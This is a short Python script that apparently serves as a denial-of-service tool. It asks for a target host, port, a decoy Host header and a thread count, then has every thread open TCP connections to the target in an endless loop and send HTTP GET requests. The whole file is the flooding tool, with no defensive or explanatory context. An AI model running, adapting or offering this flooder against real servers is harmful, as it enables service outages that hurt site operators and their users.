import threading
import socket

target = input("Whats the target\n")
port = int(input("What port is the target running on\n"))
decoy = input("Decoy Address\n")
threads = int(input("How many connections\n"))
established = 0

def flodder():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET / " + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + decoy + "\r\n\r\n").encode('ascii'),(target, port))
        s.close()

        global established
        established += 1
        if established % 50000 == 0:
            print("\r" + str(established) + " Threads processed\r")

for i in range(threads):
    thread = threading.Thread(target=flodder)
    thread.start()